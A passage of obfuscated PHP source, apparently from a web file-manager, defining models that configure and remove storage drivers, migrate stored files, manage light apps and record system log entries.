"\x64\145\146\141\165\x6c\x74", "\x64\162\151\166\145\x72", "\x63\157\x6e\146\x69\147"); public function listData($§ß†¨Üø = false, $æŒíÈ¤® = "\x6d\157\x64\x69\x66\x79\124\x69\155\145", $Ñé“òêí = false) { $²ıŞÏı =& $_SERVER[É¨™èà]; $ÀŸäìò™ = parent::listData($§ß†¨Üø, $æŒíÈ¤®, $Ñé“òêí); if ($§ß†¨Üø) { return $ÀŸäìò™; } $¦ã“–ŸÅ = array(); if ($GLOBALS[$²ıŞÏı[2337]]) { $¦ã“–ŸÅ = $this->ioSizeUseGet(array_to_keyvalue($ÀŸäìò™, $²ıŞÏı[12], $²ıŞÏı[485])); } foreach ($ÀŸäìò™ as $ûñ¤Â¿§ => $¼éº‹ÖÕ) { unset($ÀŸäìò™[$ûñ¤Â¿§][$²ıŞÏı[6]]); $ÀŸäìò™[$ûñ¤Â¿§][$²ıŞÏı[1988]] = isset($¦ã“–ŸÅ[$¼éº‹ÖÕ[$²ıŞÏı[485]]]) ? $¦ã“–ŸÅ[$¼éº‹ÖÕ[$²ıŞÏı[485]]] : 0; } return $ÀŸäìò™; } public function ioSizeUseGet($¹íåˆ‘ú) { $»æ³„Œû =& $_SERVER[É¨™èà]; if (!$¹íåˆ‘ú) { return array(); } $‹ï¢ŸÔ½ = $»æ³„Œû[2338] . implode($»æ³„Œû[50], $¹íåˆ‘ú); $Üá’ã¯İ = Cache::get($‹ï¢ŸÔ½); if ($Üá’ã¯İ) { return $Üá’ã¯İ; } $… Ãœ² = array($»æ³„Œû[914] => $»æ³„Œû[485], $»æ³„Œû[2339] => $»æ³„Œû[79]); $¹ˆæİõê = array($»æ³„Œû[914] => array($»æ³„Œû[7], $¹íåˆ‘ú)); $Üá’ã¯İ = Model($»æ³„Œû[882])->field($… Ãœ²)->where($¹ˆæİõê)->group($»æ³„Œû[914])->select(); $Üá’ã¯İ = array_to_keyvalue($Üá’ã¯İ, $»æ³„Œû[485], $»æ³„Œû[79]); Cache::set($‹ï¢ŸÔ½, $Üá’ã¯İ, 600); return $Üá’ã¯İ; } public function getConfig($Ò¡’ƒéö) { $„³§ Â = parent::listData($Ò¡’ƒéö); $îÈ¡Ø–’ = _get($„³§ Â, $_SERVER[É¨™èà][6], array()); if ($îÈ¡Ø–’ && !is_array($îÈ¡Ø–’)) { $îÈ¡Ø–’ = json_decode($îÈ¡Ø–’, !0); } return $îÈ¡Ø–’; } public function update($ÌÆõ®‡×, $©‹Ó’®„) { $Ø»¹‰¥ =& $_SERVER[É¨™èà]; $õÎã”› = $©‹Ó’®„[$Ø»¹‰¥[32]]; $Û³ˆ–Ï = array_to_keyvalue(parent::listData(), $Ø»¹‰¥[32]); if (isset($Û³ˆ–Ï[$õÎã”›]) && $Û³ˆ–Ï[$õÎã”›][$Ø»¹‰¥[485]] != $ÌÆõ®‡×) { return !1; } $this->checkPwd($ÌÆõ®‡×, $©‹Ó’®„); if (isset($©‹Ó’®„[$Ø»¹‰¥[2340]]) && $©‹Ó’®„[$Ø»¹‰¥[2340]] == $Ø»¹‰¥[91]) { $this->checkConfig($©‹Ó’®„); } unset($©‹Ó’®„[$Ø»¹‰¥[2340]]); $¿™Ë™Ô = parent::update($ÌÆõ®‡×, $©‹Ó’®„); if ($¿™Ë™Ô && $©‹Ó’®„[$Ø»¹‰¥[37]]) { foreach ($Û³ˆ–Ï as $ãö°…ıì) { if ($ãö°…ıì[$Ø»¹‰¥[37]] && $ãö°…ıì[$Ø»¹‰¥[485]] != $ÌÆõ®‡×) { parent::update($ãö°…ıì[$Ø»¹‰¥[485]], array($Ø»¹‰¥[37] => 0)); } } $this->updateBackup($ÌÆõ®‡×, $Û³ˆ–Ï); } return $¿™Ë™Ô; } public function add($ö„î›ĞÎ) { $È®›÷“® =& $_SERVER[É¨™èà]; $àêÏ½¡ô = array_to_keyvalue(parent::listData(), $È®›÷“®[32]); if (isset($àêÏ½¡ô[$ö„î›ĞÎ[$È®›÷“®[32]]])) { return !1; } $this->checkConfig($ö„î›ĞÎ); $•°Ş¤Í˜ = parent::insert($ö„î›ĞÎ); if ($•°Ş¤Í˜ && $ö„î›ĞÎ[$È®›÷“®[37]]) { foreach ($àêÏ½¡ô as $Ê´€¢È¢) { if ($Ê´€¢È¢[$È®›÷“®[37]]) { parent::update($Ê´€¢È¢[$È®›÷“®[485]], array($È®›÷“®[37] => 0)); } } $this->updateBackup($•°Ş¤Í˜, $àêÏ½¡ô); } return $•°Ş¤Í˜; } public function updateBackup($ß«èï—÷, $ó¾ç©êÊ) { $‚ëóáÀ« =& $_SERVER[É¨™èà]; if ($ß«èï—÷ == $‚ëóáÀ«[91]) { return; } $À—ç°ßĞ = Model($‚ëóáÀ«[838])->config(); $ãó´—Ì = $À—ç°ßĞ[$‚ëóáÀ«[842]]; if ($À—ç°ßĞ[$‚ëóáÀ«[1769]] != $‚ëóáÀ«[91] || $ãó´—Ì == $ß«èï—÷) { return; } if ($ãó´—Ì != $‚ëóáÀ«[91]) { $ôâû¨Íœ = array(); foreach ($ó¾ç©êÊ as $Ú¡íø¦á) { if ($ß«èï—÷ == $Ú¡íø¦á[$‚ëóáÀ«[485]]) { continue; } $ôâû¨Íœ[] = $Ú¡íø¦á[$‚ëóáÀ«[485]]; } if ($ôâû¨Íœ && in_array($ãó´—Ì, $ôâû¨Íœ)) { return; } } $±ñî™ŞÈ = Model($‚ëóáÀ«[861])->get($‚ëóáÀ«[868]); $±ñî™ŞÈ = json_decode($±ñî™ŞÈ, !0); if (!$±ñî™ŞÈ) { return; } $±ñî™ŞÈ[$‚ëóáÀ«[842]] = $ß«èï—÷; Model($‚ëóáÀ«[861])->set(array($‚ëóáÀ«[868] => $±ñî™ŞÈ)); } public function checkPwd($ô»Íï–¸, &$¹³“÷ÑÍ) { $ñéš¯öß =& $_SERVER[É¨™èà]; if (empty($¹³“÷ÑÍ[$ñéš¯öß[6]])) { return; } $‚ïØÊŞ = $¹³“÷ÑÍ[$ñéš¯öß[6]]; if (!is_array($‚ïØÊŞ)) { $‚ïØÊŞ = json_decode($‚ïØÊŞ, !0); } $©¼³çØ¨ = $ñéš¯öß[12]; $«íÖ¤ª± = array($ñéš¯öß[2341], $ñéš¯öß[2342], $ñéš¯öß[983]); foreach ($«íÖ¤ª± as $§í¯ê©İ) { if (isset($‚ïØÊŞ[$§í¯ê©İ])) { $©¼³çØ¨ = $§í¯ê©İ; break; } } if (!$©¼³çØ¨) { return; } $Å¡°À·ô = $this->getConfig($ô»Íï–¸); $Ì¦òÂÅ˜ = $Å¡°À·ô[$©¼³çØ¨]; $¨¼ïÒÒÏ = $‚ïØÊŞ[$©¼³çØ¨]; if ($¨¼ïÒÒÏ == str_repeat($ñéš¯öß[223], strlen($Ì¦òÂÅ˜))) { $‚ïØÊŞ[$©¼³çØ¨] = $Ì¦òÂÅ˜; $¹³“÷ÑÍ[$ñéš¯öß[6]] = json_encode($‚ïØÊŞ); } else { if ($¨¼ïÒÒÏ != $Ì¦òÂÅ˜) { $¹³“÷ÑÍ[$ñéš¯öß[2340]] = $ñéš¯öß[91]; } } } public function checkConfig(&$¢²§½İ¦, $Š×íĞº³ = false) { $ùÀ¹×ûä =& $_SERVER[É¨™èà]; $Ñ«óß» = strtolower($¢²§½İ¦[$ùÀ¹×ûä[98]]); $µÈÏ²¥¹ = $¢²§½İ¦[$ùÀ¹×ûä[6]]; if (!is_array($µÈÏ²¥¹)) { $µÈÏ²¥¹ = json_decode($µÈÏ²¥¹, !0); } foreach ($µÈÏ²¥¹ as $·¡‚ÌÚ => $ìİĞ°Ã•) { if (is_string($ìİĞ°Ã•)) { $µÈÏ²¥¹[$·¡‚ÌÚ] = trim($ìİĞ°Ã•); } } $µÈÏ²¥¹[$ùÀ¹×ûä[2343]] = rand_string(6); $¼ÂÊíá‡ = $GLOBALS[$ùÀ¹×ûä[6]][$ùÀ¹×ûä[92]][$ùÀ¹×ûä[922]]; $À†©‹© = isset($¼ÂÊíá‡[$Ñ«óß»]) ? $¼ÂÊíá‡[$Ñ«óß»] : ucfirst($Ñ«óß»); $±Áç·Š = $ùÀ¹×ûä[77] . $À†©‹©; if (!$À†©‹© || !class_exists($±Áç·Š)) { if ($Š×íĞº³) { return LNG($ùÀ¹×ûä[2344]); } write_log(array($ùÀ¹×ûä[2345], $¢²§½İ¦, get_caller_info()), $ùÀ¹×ûä[216]); show_json(LNG($ùÀ¹×ûä[2344]), !1, $¢²§½İ¦); } $ş×‡ğ§¾ = new $±Áç·Š($µÈÏ²¥¹); $íÅæ½¬ = rtrim($µÈÏ²¥¹[$ùÀ¹×ûä[1282]], $ùÀ¹×ûä[8]) . $ùÀ¹×ûä[8]; if (in_array($Ñ«óß», $ş×‡ğ§¾->objectDriver)) { try { if (!$ş×‡ğ§¾->isBucketCors() && !$ş×‡ğ§¾->setBucketCors()) { $©ñ—×¶ = LNG($ùÀ¹×ûä[2346]); $©ñ—×¶ .= $ùÀ¹×ûä[2347] . LNG($ùÀ¹×ûä[2348]); } } catch (Exception $…–ÀïıÁ) { $©ñ—×¶ = $…–ÀïıÁ->getMessage(); } if (isset($©ñ—×¶)) { return $this->_parseError($©ñ—×¶, $Ñ«óß», $Š×íĞº³); } if ($Ñ«óß» == $ùÀ¹×ûä[68] && !$ş×‡ğ§¾->checkRegion()) { return $this->_parseError(LNG($ùÀ¹×ûä[2349]), $Ñ«óß», $Š×íĞº³); } } else { if ($Ñ«óß» == $ùÀ¹×ûä[2350]) { if ($ş×‡ğ§¾->ftpPath) { $’•İàß£ = trim($íÅæ½¬, $ùÀ¹×ûä[8]); if (stripos($’•İàß£, trim($ş×‡ğ§¾->ftpPath, $ùÀ¹×ûä[8])) !== 0) { $íÅæ½¬ = $ş×‡ğ§¾->ftpPath . $ùÀ¹×ûä[8] . ($’•İàß£ ? $’•İàß£ . $ùÀ¹×ûä[8] : $ùÀ¹×ûä[12]); } } } } $†¯ª®Š¬ = $ş×‡ğ§¾->getPath($íÅæ½¬ . $ùÀ¹×ûä[1286]); try { if ($Ñ«óß» == $ùÀ¹×ûä[109]) { $ş×‡ğ§¾->mkdir($íÅæ½¬); } $„„Æ©Á¤ = $ş×‡ğ§¾->mkfile($†¯ª®Š¬); if (!$„„Æ©Á¤) { $©ñ—×¶ = LNG($ùÀ¹×ûä[2346]); } } catch (Exception $…–ÀïıÁ) { $©ñ—×¶ = $…–ÀïıÁ->getMessage(); } if (isset($©ñ—×¶)) { return $this->_parseError($©ñ—×¶, $Ñ«óß», $Š×íĞº³); } $µÈÏ²¥¹[$ùÀ¹×ûä[1282]] = $íÅæ½¬; $¢²§½İ¦[$ùÀ¹×ûä[6]] = json_encode($µÈÏ²¥¹); $¢²§½İ¦[$ùÀ¹×ûä[98]] = $À†©‹©; return !0; } private function _parseError($ıÂÎï÷, $Ã¦üæŞ‚, $½®¯‰¿¨ = false) { $ÒÏ¤óœ• =& $_SERVER[É¨™èà]; if ($Ã¦üæŞ‚ == $ÒÏ¤óœ•[68] && stripos($ıÂÎï÷, $ÒÏ¤óœ•[2351])) { $®òûÛáİ = explode($ÒÏ¤óœ•[10], $ıÂÎï÷); $ğ²ûú¦ = isset($®òûÛáİ[1]) ? $®òûÛáİ[1] : $ÒÏ¤óœ•[12]; $Ñ“ö¢ó¢ = array($ÒÏ¤óœ•[2352] => LNG($ÒÏ¤óœ•[2353]), $ÒÏ¤óœ•[2354] => LNG($ÒÏ¤óœ•[2355])); if (isset($Ñ“ö¢ó¢[$ğ²ûú¦])) { $ıÂÎï÷ = $Ñ“ö¢ó¢[$ğ²ûú¦]; } } if (stripos($ıÂÎï÷, $ÒÏ¤óœ•[2356]) === 0) { $ş’Ìöäš = strpos($ıÂÎï÷, $ÒÏ¤óœ•[178]); if ($ş’Ìöäš === !1) { $ş’Ìöäš = strpos($ıÂÎï÷, $ÒÏ¤óœ•[4]); } if ($ş’Ìöäš !== !1) { $ıÂÎï÷ = substr($ıÂÎï÷, $ş’Ìöäš + 1); } } $ıÂÎï÷ = LNG($ÒÏ¤óœ•[1289]) . $ıÂÎï÷; if ($½®¯‰¿¨) { return $ıÂÎï÷; } show_json($ıÂÎï÷, !1); } public function driverListSystem() { $‚îº”½‰ =& $_SERVER[É¨™èà]; $€îËª¢• = parent::listData(); $¼¹Ê‘˜ß = array(); foreach ($€îËª¢• as $¯¸­˜ÁÜ) { unset($¯¸­˜ÁÜ[$‚îº”½‰[234]], $¯¸­˜ÁÜ[$‚îº”½‰[88]]); if (!is_array($¯¸­˜ÁÜ[$‚îº”½‰[6]])) { $¯¸­˜ÁÜ[$‚îº”½‰[6]] = json_decode($¯¸­˜ÁÜ[$‚îº”½‰[6]], !0); } $¼¹Ê‘˜ß[] = $¯¸­˜ÁÜ; } return $¼¹Ê‘˜ß; } public function defaultDriver() { $ÚÏó¨ =& $_SERVER[É¨™èà]; $í¤Óñµ = parent::listData(); $³ÜƒÂïÒ = array_filter_by_field($í¤Óñµ, $ÚÏó¨[37], 1); $³ÜƒÂïÒ = $³ÜƒÂïÒ[0]; if (!$³ÜƒÂïÒ) { return array(); } if (!is_array($³ÜƒÂïÒ[$ÚÏó¨[6]])) { $³ÜƒÂïÒ[$ÚÏó¨[6]] = json_decode($³ÜƒÂïÒ[$ÚÏó¨[6]], !0); } return $³ÜƒÂïÒ; } public function driverInfo($Ô‚ÊíñÒ) { $ÙÙ°Ò =& $_SERVER[É¨™èà]; $ã«Î”«½ = array_to_keyvalue(parent::listData(), $ÙÙ°Ò[485]); if (!isset($ã«Î”«½[$Ô‚ÊíñÒ])) { return !1; } $ƒˆş¥šÕ = $ã«Î”«½[$Ô‚ÊíñÒ]; if (!is_array($ƒˆş¥šÕ[$ÙÙ°Ò[6]])) { $ƒˆş¥šÕ[$ÙÙ°Ò[6]] = json_decode($ƒˆş¥šÕ[$ÙÙ°Ò[6]], !0); } return $ƒˆş¥šÕ; } public function remove($òœ»™®‘) { $this->removeShareItems($òœ»™®‘); return parent::remove($òœ»™®‘); } public function removeWithFile($û…áõÄ, $ÅæÁßŸ, $Ø‚Ö˜Ô, $Â™ôˆŞ¸ = false) { $Àşæ«ƒ“ =& $_SERVER[É¨™èà]; $ÇœÊ¡“İ = array($Àşæ«ƒ“[914] => $û…áõÄ); $Ã½Ó†‘ = Model($Àşæ«ƒ“[556])->where($ÇœÊ¡“İ)->count(); $·¨æê¼ = Model($Àşæ«ƒ“[556])->where($ÇœÊ¡“İ)->sum($Àşæ«ƒ“[79]); $âõ±šÁ = $ÅæÁßŸ . $Àşæ«ƒ“[2357] . $û…áõÄ; $¤œÓÅ‡œ = LNG($ÅæÁßŸ == $Àşæ«ƒ“[635] ? $Àşæ«ƒ“[2358] : $Àşæ«ƒ“[2359]); $…—ñóŞˆ = new TaskFileTransfer($âõ±šÁ, $Àşæ«ƒ“[216], $Ã½Ó†‘, $¤œÓÅ‡œ . $Àşæ«ƒ“[472] . $Ø‚Ö˜Ô[$Àşæ«ƒ“[32]] . $Àşæ«ƒ“[215] . $û…áõÄ); $…—ñóŞˆ->task[$Àşæ«ƒ“[854]] = (double) $·¨æê¼; $¾ğïƒ› = KodIO::defaultDriver(); $½ªş…° = $¾ğïƒ›[$Àşæ«ƒ“[485]]; $‘òÔØ¤ = $÷€¸Ë² = $ïÏæÃ¾‡ = array(); $†°âïÌê = Model($Àşæ«ƒ“[233])->where($ÇœÊ¡“İ)->field($Àşæ«ƒ“[2360])->select(); foreach ($†°âïÌê as $ÑÆœòË) { $º»¡¤¹‡ = $ÑÆœòË[$Àşæ«ƒ“[553]]; if ($Â™ôˆŞ¸) { $÷€¸Ë²[] = $º»¡¤¹‡; continue; } $å£ ²¶Ï = $ÑÆœòË[$Àşæ«ƒ“[87]]; $™ˆÀÏä’ = get_path_father($å£ ²¶Ï); $ïÏæÃ¾‡[] = $™ˆÀÏä’; $™ˆÀÏä’ = str_replace("\x7b\x69\x6f\x3a{$û…áõÄ}\175\x2f", "\x7b\151\157\72{$½ªş…°}\175\x2f", $™ˆÀÏä’); if (!IO::exist($å£ ²¶Ï)) { $‘òÔØ¤[] = $º»¡¤¹‡; $…—ñóŞˆ->updateFileEnd($ÑÆœòË[$Àşæ«ƒ“[32]], $ÑÆœòË[$Àşæ«ƒ“[79]]); write_log($Àşæ«ƒ“[2361] . $å£ ²¶Ï, $Àşæ«ƒ“[1932]); continue; } $Ä­Ü­Ê  = IO::move($å£ ²¶Ï, $™ˆÀÏä’, REPEAT_RENAME); if (!$Ä­Ü­Ê ) { $÷€¸Ë²[] = $º»¡¤¹‡; $…—ñóŞˆ->updateFileEnd($ÑÆœòË[$Àşæ«ƒ“[32]], $ÑÆœòË[$Àşæ«ƒ“[79]]); write_log($Àşæ«ƒ“[2362] . $å£ ²¶Ï, $Àşæ«ƒ“[1932]); continue; } $ÇœÊ¡“İ = array($Àşæ«ƒ“[553] => $º»¡¤¹‡); $¦š™Î’ = array($Àşæ«ƒ“[914] => $½ªş…°, $Àşæ«ƒ“[87] => $Ä­Ü­Ê ); Model($Àşæ«ƒ“[233])->where($ÇœÊ¡“İ)->save($¦š™Î’); } $“€î„¬º = $…—ñóŞˆ->task; if (!$Â™ôˆŞ¸) { Cache::set($âõ±šÁ, $“€î„¬º); } $…—ñóŞˆ->end(); $‘òÔØ¤ = array_unique($‘òÔØ¤); $÷€¸Ë² = array_unique($÷€¸Ë²); if (!$Â™ôˆŞ¸ && ($‘òÔØ¤ || $÷€¸Ë²)) { $£İ©Ôğ— = array(); if ($‘òÔØ¤) { $£İ©Ôğ—[] = sprintf(LNG($Àşæ«ƒ“[2363]), count($‘òÔØ¤)); } if ($÷€¸Ë²) { $£İ©Ôğ—[] = sprintf(LNG($Àşæ«ƒ“[2364]), count($÷€¸Ë²)); } $£İ©Ôğ— = sprintf(LNG($Àşæ«ƒ“[2365]), implode($Àşæ«ƒ“[2366], $£İ©Ôğ—)) . $Àşæ«ƒ“[2367] . date($Àşæ«ƒ“[2368]) . $Àşæ«ƒ“[2369]; if ($ÅæÁßŸ == $Àşæ«ƒ“[1247]) { $£İ©Ôğ— .= $Àşæ«ƒ“[2370] . LNG($Àşæ«ƒ“[2371]); } else { $£İ©Ôğ— = LNG($Àşæ«ƒ“[2372]) . $Àşæ«ƒ“[2373] . $£İ©Ôğ—; } $“€î„¬º[$Àşæ«ƒ“[1284]] = $£İ©Ôğ—; Cache::set($âõ±šÁ, $“€î„¬º); unset($Ø‚Ö˜Ô[$Àşæ«ƒ“[6]]); $ñ˜üö¦Ş = array($Àşæ«ƒ“[485] => $û…áõÄ, $Àşæ«ƒ“[2242] => $Àşæ«ƒ“[635], $Àşæ«ƒ“[32] => $Ø‚Ö˜Ô[$Àşæ«ƒ“[32]], $Àşæ«ƒ“[98] => $Ø‚Ö˜Ô[$Àşæ«ƒ“[98]]); Hook::trigger($Àşæ«ƒ“[1811], array($Àşæ«ƒ“[1307] => $ñ˜üö¦Ş, $Àşæ«ƒ“[1317] => !0)); show_json($£İ©Ôğ—, !1, 100111); } if ($ÅæÁßŸ == $Àşæ«ƒ“[635]) { return !0; } if ($‘òÔØ¤ || $÷€¸Ë²) { $‡ı•‡¶¦ = array_merge($‘òÔØ¤, $÷€¸Ë²); $‡ı•‡¶¦ = array_filter(array_unique($‡ı•‡¶¦)); $this->removeByFileID($‡ı•‡¶¦); } if ($ïÏæÃ¾‡) { $ïÏæÃ¾‡ = array_filter(array_unique($ïÏæÃ¾‡)); foreach ($ïÏæÃ¾‡ as $å£ ²¶Ï) { $¸õå©Î§ = IO::has($å£ ²¶Ï, !0); if (!$¸õå©Î§[$Àşæ«ƒ“[242]] && !$¸õå©Î§[$Àşæ«ƒ“[243]]) { IO::remove($å£ ²¶Ï); } } } return $this->remove($û…áõÄ); } private function removeByFileID($ìÔ¸ïŒ¾ = array()) { $´¿†™®ã =& $_SERVER[É¨™èà]; if (empty($ìÔ¸ïŒ¾)) { return; } $¹“àÕìø = array($´¿†™®ã[553] => array($´¿†™®ã[7], $ìÔ¸ïŒ¾)); $‡Õ¥÷üÕ = Model($´¿†™®ã[1448])->where($¹“àÕìø)->field($´¿†™®ã[2318])->select(); if (!$‡Õ¥÷üÕ) { return Model($´¿†™®ã[556])->remove($ìÔ¸ïŒ¾); } $‡Õ¥÷üÕ = array_to_keyvalue($‡Õ¥÷üÕ, $´¿†™®ã[194], $´¿†™®ã[553]); foreach ($‡Õ¥÷üÕ as $éÔõâ¶à => $ø§îÚõ) { Model($´¿†™®ã[921])->removeNow($éÔõâ¶à, !1); } $öƒ€ÌÀá = array_diff($ìÔ¸ïŒ¾, array_unique(array_values($‡Õ¥÷üÕ))); if ($öƒ€ÌÀá) { return Model($´¿†™®ã[556])->remove($öƒ€ÌÀá); } } private function removeShareItems($­ÃúŠë”) { $‹å€’€õ =& $_SERVER[É¨™èà]; $Ô•ºœš» = "\173\151\x6f\x3a{$­ÃúŠë”}\x7d\x2f"; $Å·³í¡ = array($‹å€’€õ[194] => 0, $‹å€’€õ[1277] => array($‹å€’€õ[469], "{$Ô•ºœš»}\x25")); $¸ù‹Š©¦ = Model($‹å€’€õ[1979])->where($Å·³í¡)->field($‹å€’€õ[680])->select(); if (empty($¸ù‹Š©¦)) { return; } $ëš‰º† = array_to_keyvalue($¸ù‹Š©¦, $‹å€’€õ[12], $‹å€’€õ[680]); Model($‹å€’€õ[679])->remove($ëš‰º†); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x4c\151\x67\150\x74\x41\160\x70"; public $modelType = "\123\x79\163\164\145\155\117\160\x74\151\157\156"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\x70", "\144\x65\x73\x63", "\x63\157\x6e\x74\x65\156\164"); public function listData($§ÚÓÇá´ = false, $Ú³Ù¤Â­ = "\x6d\157\144\151\x66\x79\124\x69\155\x65", $˜ç¨‘Øè = true) { return parent::listData($§ÚÓÇá´, $Ú³Ù¤Â­, $˜ç¨‘Øè); } public function remove($×™»“·°) { $êïà«® = $this->findByName($×™»“·°); if (!$êïà«®) { return !1; } return parent::remove($êïà«®[$_SERVER[É¨™èà][485]]); } public function add($Í¨¾ŒÒÜ) { if ($this->findByName($Í¨¾ŒÒÜ[$_SERVER[É¨™èà][32]])) { return !1; } return parent::insert($Í¨¾ŒÒÜ); } public function update($®¾õÄÚå, $•ÏÄıÛÛ) { $Š¡½¤Íí =& $_SERVER[É¨™èà]; $Íö‰ıåÍ = $this->findByName($®¾õÄÚå); $³ÀçÇ´ = $this->findByName($•ÏÄıÛÛ[$Š¡½¤Íí[32]]); if (!$Íö‰ıåÍ || $³ÀçÇ´ && $³ÀçÇ´[$Š¡½¤Íí[485]] != $Íö‰ıåÍ[$Š¡½¤Íí[485]]) { return !1; } return parent::update($Íö‰ıåÍ[$Š¡½¤Íí[485]], $•ÏÄıÛÛ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\x69\155\x65", "\x74\151\155\145", "\151\156\163\x65\162\164", "\146\165\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $½šàã¤ =& $_SERVER[É¨™èà]; return array($½šàã¤[2374] => LNG($½šàã¤[2375]), $½šàã¤[2376] => LNG($½šàã¤[2377]), $½šàã¤[1943] => LNG($½šàã¤[2378]), $½šàã¤[2379] => LNG($½šàã¤[2380]), $½šàã¤[2381] => LNG($½šàã¤[2382]), $½šàã¤[2383] => LNG($½šàã¤[2384]), $½šàã¤[2385] => LNG($½šàã¤[2386]), $½šàã¤[1972] => LNG($½šàã¤[2386]), $½šàã¤[1973] => LNG($½šàã¤[2387]), $½šàã¤[2388] => LNG($½šàã¤[2389]), $½šàã¤[2390] => LNG($½šàã¤[2391]), $½šàã¤[2392] => LNG($½šàã¤[2393]), $½šàã¤[2394] => LNG($½šàã¤[2395]), $½šàã¤[1970] => LNG($½šàã¤[2396]), $½šàã¤[2397] => LNG($½šàã¤[2398]), $½šàã¤[1977] => LNG($½šàã¤[2399]), $½šàã¤[2400] => LNG($½šàã¤[2401]), $½šàã¤[2402] => LNG($½šàã¤[2403]), $½šàã¤[2404] => LNG($½šàã¤[2405]), $½šàã¤[2406] => LNG($½šàã¤[2407]), $½šàã¤[1980] => LNG($½šàã¤[2408]), $½šàã¤[1981] => LNG($½šàã¤[2409]), $½šàã¤[2410] => LNG($½šàã¤[2411]), $½šàã¤[2412] => LNG($½šàã¤[2413]), $½šàã¤[2414] => LNG($½šàã¤[2415]), $½šàã¤[1975] => LNG($½šàã¤[2416]), $½šàã¤[2417] => LNG($½šàã¤[2418]), $½šàã¤[1974] => LNG($½šàã¤[2419]), $½šàã¤[2420] => LNG($½šàã¤[2420]), $½šàã¤[2421] => LNG($½šàã¤[2422]), $½šàã¤[2423] => LNG($½šàã¤[2420]), $½šàã¤[2424] => LNG($½šàã¤[2425]), $½šàã¤[2426] => LNG($½šàã¤[2427]), $½šàã¤[2428] => LNG($½šàã¤[2427]), $½šàã¤[2429] => LNG($½šàã¤[2430]), $½šàã¤[2431] => LNG($½šàã¤[2431]), $½šàã¤[2432] => LNG($½šàã¤[1947]), $½šàã¤[2433] => LNG($½šàã¤[2434]), $½šàã¤[2435] => LNG($½šàã¤[2436]), $½šàã¤[2437] => LNG($½šàã¤[2438]), $½šàã¤[2439] => LNG($½šàã¤[2440]), $½šàã¤[2441] => LNG($½šàã¤[2442]), $½šàã¤[2443] => LNG($½šàã¤[2443]), $½šàã¤[2444] => LNG($½šàã¤[2445]), $½šàã¤[2446] => LNG($½šàã¤[2447]), $½šàã¤[2448] => LNG($½šàã¤[2449]), $½šàã¤[2450] => LNG($½šàã¤[2451]), $½šàã¤[2452] => LNG($½šàã¤[2453]), $½šàã¤[2454] => LNG($½šàã¤[2455]), $½šàã¤[213] => LNG($½šàã¤[213]), $½šàã¤[214] => LNG($½šàã¤[2456]), $½šàã¤[2457] => LNG($½šàã¤[2457])); } private function typeFile() { $ùÄªÁîß =& $_SERVER[É¨™èà]; $õÀÁúÉ” = array($ùÄªÁîß[1977] => array($ùÄªÁîß[1978]), $ùÄªÁîß[2392] => array($ùÄªÁîß[2458]), $ùÄªÁîß[2394] => array($ùÄªÁîß[2459]), $ùÄªÁîß[1970] => array($ùÄªÁîß[1971], $ùÄªÁîß[2460]), $ùÄªÁîß[2402] => array(), $ùÄªÁîß[2404] => array(), $ùÄªÁîß[2406] => array(), $ùÄªÁîß[1980] => array($ùÄªÁîß[1982]), $ùÄªÁîß[1981] => array($ùÄªÁîß[1982]), $ùÄªÁîß[2410] => array($ùÄªÁîß[2461]), $ùÄªÁîß[2412] => array($ùÄªÁîß[2461]), $ùÄªÁîß[2414] => array($ùÄªÁîß[2462]), $ùÄªÁîß[2400] => array($ùÄªÁîß[2463]), $ùÄªÁîß[1975] => array($ùÄªÁîß[2464]), $ùÄªÁîß[2417] => array($ùÄªÁîß[2465]), $ùÄªÁîß[1974] => array($ùÄªÁîß[1976])); return $õÀÁúÉ”; } private function typeAll() { $¹¾¶İÉÌ =& $_SERVER[É¨™èà]; $•Â’‡ö = $this->typeList; $ô·Éìƒ„ = array_filter($this->typeFile()); foreach ($ô·Éìƒ„ as $ÓÏ…›ì¯ => $Ç±çñÇÇ) { $•Â’‡ö[$Ç±çñÇÇ[0]] = $•Â’‡ö[$ÓÏ…›ì¯]; } $•Â’‡ö[$¹¾¶İÉÌ[1982]] = LNG($¹¾¶İÉÌ[2466]); $•Â’‡ö[$¹¾¶İÉÌ[2461]] = LNG($¹¾¶İÉÌ[2467]); return $•Â’‡ö; } public function addLog($ú¯˜£¸, $Ò›òÛøŸ = array()) { $ëÉœü©Ê =& $_SERVER[É¨™èà]; if (!isset($this->typeList[$ú¯˜£¸])) { return; } $ı‘Š¹ç = Session::get($ëÉœü©Ê[2140]); if (!$ı‘Š¹ç) { $ı‘Š¹ç = _get($Ò›òÛøŸ, $ëÉœü©Ê[1800], 0); } if ($ú¯˜£¸ == $ëÉœü©Ê[2433] && is_array($Ò›òÛøŸ[$ëÉœü©Ê[2468]]) && !$Ò›òÛøŸ[$ëÉœü©Ê[2468]]) { return; } $ñúµĞğˆ = get_client_ip(); if (!$Ò›òÛøŸ || strlen(json_encode($Ò›òÛøŸ)) >= 1024 * 64) { if ($Ò›òÛøŸ && is_array($Ò›òÛøŸ)) { $Ò›òÛøŸ = array_intersect_key($Ò›òÛøŸ, array_flip($ëÉœü©Ê[485], $ëÉœü©Ê[32])); $Ò›òÛøŸ[$ëÉœü©Ê[2469]] = $ñúµĞğˆ; } else { $Ò›òÛøŸ = array($ëÉœü©Ê[2469] => $ñúµĞğˆ); } } else { if (is_array($Ò›òÛøŸ)) { $Ò›òÛøŸ[$ëÉœü©Ê[2469]] = $ñúµĞğˆ; } else { $Ò›òÛøŸ = array($ëÉœü©Ê[1307] => $Ò›òÛøŸ, $ëÉœü©Ê[2469] => $ñúµĞğˆ); } } $Ò›òÛøŸ = array($ëÉœü©Ê[1790] => Session::sign(), $ëÉœü©Ê[1791] => intval($ı‘Š¹ç), $ëÉœü©Ê[33] => $ú¯˜£¸, $ëÉœü©Ê[1793] => json_encode($Ò›òÛøŸ)); return parent::add($Ò›òÛøŸ); } public function remove($ ‘ÓÂı) { $this->where(array($_SERVER[É¨™èà][503] => $ ‘ÓÂı))->delete(); } private function _makeOrder($ ª’óÄ = '') { $î±–öúâ =& $_SERVER[É¨™èà]; $øÉ‚Û = $î±–öúâ[234]; $éö—°³ã = array($î±–öúâ[533] => $î±–öúâ[534], $î±–öúâ[535] => $î±–öúâ[536]); $Âåœçå = 